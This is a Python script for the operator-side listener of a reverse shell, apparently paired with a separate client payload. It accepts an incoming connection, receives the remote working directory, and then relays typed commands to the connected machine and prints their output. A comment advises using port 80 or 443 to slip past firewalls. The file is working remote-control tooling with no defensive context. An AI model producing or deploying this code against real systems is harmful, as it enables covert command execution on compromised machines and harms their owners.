import socket
import sys

from rich.console import Console
from rich.traceback import install
from rich.progress import track

install()
console = Console(record=True)
SERVER_HOST = "0.0.0.0"  # all IPv4 addresses on the local machine (int or ext)
SERVER_PORT = 5070  # better common ports 80 or 443, so no firewall
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"




# socket object
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER_HOST, SERVER_PORT))  # bind socket to akk ip addresses
s.listen(25)  # listen for connections

print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]},{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

if __name__ == "__main__":
    while True:
        try:
            # get the command from prompt
            command = input(f"{cwd} $> ")
            if not command.strip():
                # empty command
                continue
            # send the command to the client
            client_socket.send(command.encode())
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            # retrieve command results
            output = client_socket.recv(BUFFER_SIZE).decode()
            # split command output and current directory
            results, cwd = output.split(SEPARATOR)
            # print output
            console.log(results)
        except KeyboardInterrupt:
            console.log("exiting...")
            s.shutdown(socket.SHUT_RDWR)
            s.close()
            sys.exit()